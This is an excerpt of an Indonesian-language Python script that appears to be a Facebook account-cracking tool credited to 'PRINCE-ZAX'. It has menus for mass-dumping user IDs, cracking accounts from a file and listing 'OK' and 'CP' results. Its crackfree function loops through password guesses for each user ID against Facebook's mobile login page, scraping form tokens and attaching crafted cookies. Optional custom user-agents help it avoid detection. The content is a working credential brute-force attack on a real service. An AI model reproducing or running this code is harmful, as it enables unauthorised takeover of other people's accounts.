...
def menu(my_name,my_id):
	...
	print(f'========================================') 
	print(f'{h}• Status : FREE RASA PREM {x} ') 
	print(f'{h}• Recode : PRINCE-ZAX{x}') 
	print(f'========================================') 
	...
	print(f'[•]0.Keluar  ')
	print(f'========================================') 
	_____PRINCE__ZAX_____ = input('\n├──> Pilih : ')
	print(f'========================================') 
	if _____PRINCE__ZAX_____ in ['1']:
		dump_massal()
	elif _____PRINCE__ZAX_____ in ['2']:
		dump()
	elif _____PRINCE__ZAX_____ in ['3']:
		result()
	elif _____PRINCE__ZAX_____ in ['4']:
		crack_file()
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('[1] Hasil OK Anda ')
	print('[2] Hasil CP Anda ')
	print('[3] Kembali	')
	kz = input(f'\n├──> Pilih : ')
	if kz in ['2']:
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'=================================================') 
		print(f'Masukan Kata Sandi Tambahan, Minimal 6 Huruf') 
	...
	uatambah = input(f'├──>Tambah User-Agent Manual ? ( y/t ) ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bjir = input(f'├──> Masukan User-Agent : {u}')
		ualu.append(bjir)
	else:
		ualuh.append('tidak')
	passwrd()
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=197407850779691&kid_directed_site=0&app_id=197407850779691&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D197407850779691%26auth_type%3Dreauthenticate%26cbt%3D1697252808326%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df136e665dd94da8%2526domain%253Dadmin.easystore.co%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fadmin.easystore.co%25252Ff6cfa62dddcc38%2526relation%253Dopener%26client_id%3D197407850779691%26display%3Dtouch%26domain%3Dadmin.easystore.co%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fadmin.easystore.co%252Flogin%253Flocale%253Did_ID%2526_gl%253D1%25252a14do55v%25252a_gcl_au%25252aMTY3ODM1NDQ5My4xNjk3MjUyNzY5%25252a_ga%25252aNTc0OTI0MzYzLjE2OTcyNTI3NzQ.%25252a_ga_JY9695ZNM0%25252aMTY5NzI1Mjc3NC4xLjAuMTY5NzI1Mjc3NC42MC4wLjA.%26locale%3Den_US%26logger_id%3Df200451911d72d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df39e9c4826be484%2526domain%253Dadmin.easystore.co%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fadmin.easystore.co%25252Ff6cfa62dddcc38%2526relation%253Dopener%2526frame%253Dfcc1b078270aa%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df39e9c4826be484%26domain%3Dadmin.easystore.co%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fadmin.easystore.co%252Ff6cfa62dddcc38%26relation%3Dopener%26frame%3Dfcc1b078270aa%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/dialog/oauth?app_id=197407850779691&auth_type=reauthenticate&cbt=1697252808326&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df136e665dd94da8%26domain%3Dadmin.easystore.co%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fadmin.easystore.co%252Ff6cfa62dddcc38%26relation%3Dopener&client_id=197407850779691&display=touch&domain=admin.easystore.co&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fadmin.easystore.co%2Flogin%3Flocale%3Did_ID%26_gl%3D1%252a14do55v%252a_gcl_au%252aMTY3ODM1NDQ5My4xNjk3MjUyNzY5%252a_ga%252aNTc0OTI0MzYzLjE2OTcyNTI3NzQ.%252a_ga_JY9695ZNM0%252aMTY5NzI1Mjc3NC4xLjAuMTY5NzI1Mjc3NC42MC4wLjA.&locale=en_US&logger_id=f200451911d72d8&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df39e9c4826be484%26domain%3Dadmin.easystore.co%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fadmin.easystore.co%252Ff6cfa62dddcc38%26relation%3Dopener%26frame%3Dfcc1b078270aa&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
